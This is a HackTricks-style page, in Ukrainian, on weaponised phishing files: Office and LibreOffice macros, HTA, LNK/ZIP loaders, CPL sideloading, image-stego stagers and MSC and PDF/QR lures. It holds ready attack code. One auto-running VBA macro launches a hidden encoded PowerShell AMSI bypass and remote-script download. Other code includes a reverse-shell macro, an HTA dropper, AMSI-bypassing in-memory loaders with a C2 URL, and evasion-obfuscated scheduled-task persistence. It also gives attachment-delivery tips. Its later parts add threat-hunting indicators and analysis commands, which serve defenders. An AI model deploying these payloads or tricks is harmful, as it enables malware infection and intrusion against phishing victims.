# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує перевірку даних файлу перед його відкриттям. Перевірка даних виконується шляхом ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак можна перейменувати файл, змінивши розширення, і при цьому зберегти можливість виконання макросів.\
Наприклад, RTF-файл за задумом не підтримує макроси, але файл DOCM, перейменований на RTF, оброблятиметься Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всіх програм Microsoft Office Suite (Excel, PowerPoint тощо).

За допомогою наведеної нижче команди можна перевірити, які розширення виконуватимуться деякими програмами Office:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-файли, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить макроси, також можуть «виконувати» макроси.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Категорії**: Links and References, **Назви полів**: includePicture, **Ім’я файлу або URL**:_ http://<ip>/whatever

![Документи Office — завантаження зовнішнього зображення: перейдіть до Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor через макроси

За допомогою макросів можна запускати довільний код із документа.

#### Функції автозапуску

Що частіше вони використовуються, то вища ймовірність, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Видалення метаданих вручну

Перейдіть до **Файл > Відомості > Перевірити документ > Перевірити документ**, щоб відкрити інспектор документів. Натисніть **Перевірити**, а потім **Видалити все** поруч із пунктом **Властивості документа та персональні відомості**.

#### Розширення DOC

Коли завершите, виберіть спадне меню **Тип файлу**, змініть формат із **`.docx`** на Word 97–2003 **`.doc`**.\
Зробіть це, тому що **не можна зберігати макроси у файлі `.docx`**, а розширення **`.docm`** із підтримкою макросів має **погану репутацію** (наприклад, на мініатюрі є велика позначка `!`, а деякі веб- та поштові шлюзи повністю блокують такі файли). Тому застаріле розширення **`.doc` — найкращий компроміс**.

#### Генератори шкідливих макросів

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Макроси LibreOffice ODT, що запускаються автоматично (Basic)

Документи LibreOffice Writer можуть містити макроси Basic і запускати їх автоматично під час відкриття файлу, якщо прив’язати макрос до події **Відкрити документ** (Інструменти → Налаштувати → Події → Відкрити документ → Макрос…).<sup>[[1]](#references)</sup> Простий макрос reverse shell виглядає так:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Зверніть увагу на подвоєні лапки (`""`) у рядку: LibreOffice Basic використовує їх для екранування буквальних лапок, тому payloads, що закінчуються на `...==""")`, зберігають збалансованими і внутрішню команду, і аргумент Shell.

Поради щодо доставки:

- Збережіть файл як `.odt` і прив’яжіть macro до події документа, щоб він запускався одразу після відкриття.
- Під час надсилання email за допомогою `swaks` використовуйте `--attach @resume.odt` (символ `@` потрібен, щоб як вкладення надіслалися байти файлу, а не рядок із його назвою). Це критично під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## Файли HTA

HTA — це програма Windows, яка **поєднує HTML і скриптові мови (наприклад, VBScript і JScript)**. Вона створює інтерфейс користувача й запускається як застосунок із «повним рівнем довіри», без обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, отже **`mshta` залежить від IE**. Тому, якщо його видалили, HTA не зможуть запускатися.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Примусова NTLM-аутентифікація

Є кілька способів **примусово викликати NTLM-аутентифікацію «віддалено»**. Наприклад, можна додати **невидимі зображення** до електронних листів або HTML-сторінок, які відкриє користувач (навіть через HTTP MitM?). Або надіслати жертві **адресу файлів**, які **ініціюють** **аутентифікацію**, щойно вона **відкриє папку**.

**Перевірте ці та інші ідеї на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або облікові дані для аутентифікації, а й **виконувати NTLM relay-атаки**:

- [**NTLM relay-атаки**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + payloads, вбудовані в ZIP (безфайловий ланцюжок)

У високоефективних кампаніях надсилають ZIP-архів із двома легітимними документами-приманками (PDF/DOCX) і шкідливим .lnk-файлом. Трюк полягає в тому, що сам PowerShell loader зберігається в сирих байтах ZIP-архіву після унікального маркера, а .lnk витягує його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типова послідовність дій, реалізована однорядковою командою PowerShell у файлі .lnk:

1) Знайти оригінальний ZIP у типових шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і батьківській папці поточного робочого каталогу.
2) Прочитати байти ZIP-архіву та знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера — це вбудований PowerShell payload.
3) Скопіювати ZIP у %ProgramData%, розпакувати його там і відкрити документ-приманку .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для витягування та запуску вбудованого етапу:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Нотатки
- Доставка часто зловживає піддоменами авторитетних PaaS (наприклад, *.herokuapp.com) і може фільтрувати payload-и (віддавати нешкідливі ZIP-файли залежно від IP/UA).
- Наступний етап часто розшифровує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Persistence, що використовується в тому самому ланцюжку
- Перехоплення COM TypeLib елемента керування Microsoft Web Browser, через яке IE/Explorer або будь-яка програма, що його вбудовує, автоматично повторно запускає payload.<sup>[[2]](#references)[[4]](#references)</sup> Докладніше та готові до використання команди:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук загроз/IOC
- ZIP-файли з доданим до даних архіву ASCII-маркером (наприклад, xFIQCV).
- .lnk, який перебирає батьківські папки та папки користувача, щоб знайти ZIP-файл і відкрити документ-приманку.
- Втручання в AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довгі робочі ланцюжки листування, що завершуються посиланнями на довірених PaaS-доменах.

## Спершу приманка в LNK → persistence через заплановане завдання → sideloading довіреного CPL

Ще один поширений шаблон — **`.lnk`, що маскується під документ** і відразу відкриває нешкідливу приманку, паралельно розгортаючи справжній ланцюжок у фоновому режимі.<sup>[[3]](#references)</sup>

Спостережуваний процес:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний проксі для запуску обфускованого завантажувача PowerShell.
2. PowerShell розбиває очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), щоб прості засоби виявлення, які шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, не виявили команду.
3. Стейджер спершу завантажує **документ-приманку**, відкриває його для жертви, а потім у фоновому режимі відновлює шкідливі файли.
4. Payload-и можуть записуватися з **непримітними розширеннями**, а потім перейменовуватися зі видаленням символів-заповнювачів, що затримує появу очевидних артефактів `.exe` / `.cpl`.
5. Persistence забезпечується **запланованим завданням, що запускається щохвилини** й запускає довірений хост-бінарний файл із каталогу, доступного для запису користувачу.

Основні ознаки для пошуку в цьому шаблоні:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Корисне розташування файлів для staging, на яке варто звернути увагу:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий етап є stealthy

У кейсі Rapid7 заплановане завдання неодноразово запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки поруч із ним розмістили **`APPWIZ.cpl`**, який експортував **`RunFODW`**, довірений бінарний файл Microsoft виконував side-loading CPL зловмисника замість легітимної системної копії.

Потім CPL:
- Зчитує blob **AES-256-CBC** з `C:\Windows\Tasks\editor.dat`
- Розшифровує його через **Windows CNG / `bcrypt.dll`**
- Виділяє виконувану пам'ять і копіює туди розшифрований shellcode
- Виконує його опосередковано, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

За цим останнім кроком варто стежити окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимним WinAPI, що приймає callback**, для передачі керування.

Розшифрованим payload у цій кампанії був shellcode **Donut**, який потім повністю відображав кінцевий PE у пам'ять і патчив **AMSI/WLDP/ETW** у поточному процесі перед передачею керування. Докладніші примітки щодо side-loading і post-processing у пам'яті дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні напрямки пошуку:
- `.lnk`, що запускають `powershell.exe` або `conhost.exe`, а потім відкривають видимий документ-приманку.
- Короткочасні завантаження в **`C:\Users\Public\`**, за якими одразу відбувається перейменування файлів із безглуздими розширеннями.
- Заплановані завдання з непримітними назвами, як-от `GoogleErrorReport`, що запускаються з **каталогів, доступних для запису користувачам**.
- Довірені бінарні файли, що завантажують файли **`.cpl` / `.dll`** з того самого несистемного каталогу.
- Текстові blob у форматі Base64, записані в **`C:\Windows\Tasks\`**, а потім зчитані модулем, запущеним через side-loading.

## Payload із роздільниками стеганографії в зображеннях (PowerShell stager)

Останні ланцюжки завантаження доставляють обфускований JavaScript/VBS, який декодує та запускає PowerShell stager у форматі Base64. Цей stager завантажує зображення (часто GIF), що містить приховану звичайним текстом між унікальними маркерами початку/кінця DLL .NET у форматі Base64. Скрипт шукає ці роздільники (приклади, помічені в реальних атаках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, декодує його з Base64 у байти, завантажує збірку в пам'ять і викликає відомий метод точки входу з URL C2.<sup>[[5]](#references)</sup>

Робочий процес
- Етап 1: архівований JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager з параметрами -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, вирізає Base64 між маркерами, завантажує DLL .NET у пам'ять і викликає її метод (наприклад, VAI), передаючи URL C2 та параметри.
- Етап 3: loader отримує кінцевий payload і зазвичай впроваджує його за допомогою process hollowing у довірений бінарний файл (часто MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Докладніше про process hollowing і виконання через проксі довірених утиліт дивіться тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вилучення DLL із зображення та виклику методу .NET у пам'яті:

<details>
<summary>Екстрактор stego payload і loader на PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Примітки
- Це ATT&CK T1027.003 (стеганографія/приховування маркерів).<sup>[[6]](#references)</sup> Маркери відрізняються в різних кампаніях.
- AMSI/ETW bypass і деобфускацію рядків зазвичай виконують перед завантаженням assembly.
- Пошук загроз: скануйте завантажені зображення на наявність відомих роздільників; виявляйте випадки, коли PowerShell звертається до зображень і відразу декодує Base64 blobs.

Див. також інструменти для stego та методи carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Повторюваний початковий етап — невеликий, сильно обфускований `.js` або `.vbs`, доставлений в архіві. Його єдина мета — декодувати вбудований рядок Base64 і запустити PowerShell з параметрами `-nop -w hidden -ep bypass`, щоб завантажити наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Схематична логіка (абстрактно):
- Прочитати вміст власного файла
- Знайти blob Base64 між рядками-заповнювачами
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, запустивши `powershell.exe`

Ознаки для пошуку
- Архівні вкладення JS/VBS, що запускають `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` із тимчасових каталогів користувача.

## Документи MSC як контейнери для виконання (GrimResource)

Файли Microsoft Management Console (`.msc`) — це XML-визначення консолей, які зазвичай відкриваються через `mmc.exe`. **GrimResource** використовує посилання `StringTable` на ресурс `apds.dll`, що містить застарілий XSS-примітив, тож відкриття створеної зловмисниками консолі користувачем призводить до виконання JavaScript у `mmc.exe`. У виявлених зразках обфускація на основі `transformNode` поєднувалася з **DotNetToJScript**, щоб створити .NET payload без звичного шляху через макроси Office.<sup>[[9]](#references)</sup>

Для статичного аналізу розглядайте недовірений MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Високосигнальними runtime-ознаками є завантаження CLR або script-компонентів процесом `mmc.exe`, створення ним мережевих з’єднань або запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` чи неочікуваного виконуваного файла. Оскільки формат легітимний, засоби виявлення мають зіставляти **джерело + підозрілий XML/script-вміст + поведінку `mmc.exe`**, а не блокувати всі MSC-файли.<sup>[[9]](#references)</sup>

## PDF/QR-редиректори та керування доставкою payload

PDF не обов’язково має містити експлойт, щоб бути корисним. У нещодавніх кампаніях у документ, що виглядає нешкідливим, додають **QR-код або звичайне посилання**, виводять браузерну сесію за межі контролю поштового сервісу та персоналізують адресу призначення, додаючи адресу одержувача. Microsoft задокументувала PDF-файли 2025 року, QR-коди яких містили унікальні для кожного одержувача URL-адреси, що вели до інфраструктури викрадення облікових даних RaccoonO365; у паралельному ланцюжку використовували фільтрацію за IP-адресою та середовищем, щоб показувати вибраним відвідувачам шлях JavaScript/MSI, а сканерам або клієнтам, які не відповідали вимогам, — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час первинного аналізу перевіряйте і дії PDF, і відрендерені QR-коди. QR-код може бути намальований векторно, а не збережений як зображення, яке можна видобути, тож перетворюйте кожну сторінку на растрове зображення, а також видобувайте вбудовані зображення:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Переглядайте декодовані адреси призначення та перенаправлення з ізольованої системи аналізу, не автентифікуючись. Корисні ознаки для пошуку: PDF-файли лише з QR-кодами й майже порожнім текстом листа, адреса електронної пошти одержувача в параметрі запиту, кілька перенаправлень через надійні хостинги та різний вміст залежно від IP-адреси, геолокації, cookie, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки один запит із sandbox може повернути лише приманку.<sup>[[10]](#references)</sup>

## Файли Windows для крадіжки NTLM-хешів

Перегляньте сторінку про **місця для крадіжки облікових даних NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – макрос LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна phishing-атака на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження тактики Dropping Elephant через ланцюжок loader-ів на тему Китаю](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – нова техніка persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – loader PhantomVAI доставляє різні infostealer-и](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для початкового доступу та ухилення від виявлення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – зловмисники використовують податковий сезон для розгортання phishing-кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
